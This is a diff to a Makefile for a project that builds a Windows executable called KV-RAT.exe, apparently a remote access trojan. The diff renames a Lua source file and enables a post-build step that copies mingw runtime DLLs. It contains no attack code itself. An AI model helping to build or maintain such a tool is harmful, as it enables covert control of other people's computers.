@@ -9,7 +9,7 @@ UTIL_DIR = $(SRC_DIR)/Utils
 CMD_DIR = $(SRC_DIR)/Commands
 
 # Source files
-SRCS = $(SRC_DIR)/main.cpp $(SRC_DIR)/networking.cpp $(UTIL_DIR)/Utils.cpp $(CMD_DIR)/Commands.cpp $(CMD_DIR)/CommandHandler.cpp $(SRC_DIR)/onload.cpp $(CMD_DIR)/LuaCommands.cpp
+SRCS = $(SRC_DIR)/main.cpp $(SRC_DIR)/networking.cpp $(UTIL_DIR)/Utils.cpp $(CMD_DIR)/Commands.cpp $(CMD_DIR)/CommandHandler.cpp $(SRC_DIR)/onload.cpp $(CMD_DIR)/LuaBackend.cpp
 OBJS = $(addprefix $(BUILD_DIR)/, $(notdir $(SRCS:.cpp=.o)))
 
 .PHONY: directories clean all post-build
@@ -32,10 +32,10 @@ $(BUILD_DIR)/%.o: $(UTIL_DIR)/%.cpp
 $(BUILD_DIR)/%.o: $(CMD_DIR)/%.cpp
 	$(CC) $(CFLAGS) -c $< -o $@
 
-#post-build: 
-	#cp /usr/x86_64-w64-mingw32/bin/libgcc_s_seh-1.dll $(BUILD_DIR)
-	#cp /usr/x86_64-w64-mingw32/bin/libstdc++-6.dll $(BUILD_DIR)
-	#cp /usr/x86_64-w64-mingw32/bin/libwinpthread-1.dll $(BUILD_DIR)
+post-build: 
+	cp /usr/x86_64-w64-mingw32/bin/libgcc_s_seh-1.dll $(BUILD_DIR)
+	cp /usr/x86_64-w64-mingw32/bin/libstdc++-6.dll $(BUILD_DIR)
+	cp /usr/x86_64-w64-mingw32/bin/libwinpthread-1.dll $(BUILD_DIR)
 
 clean:  
 	rm -rf $(BUILD_DIR)/*.o $(BUILD_DIR)/KV-RAT.exe
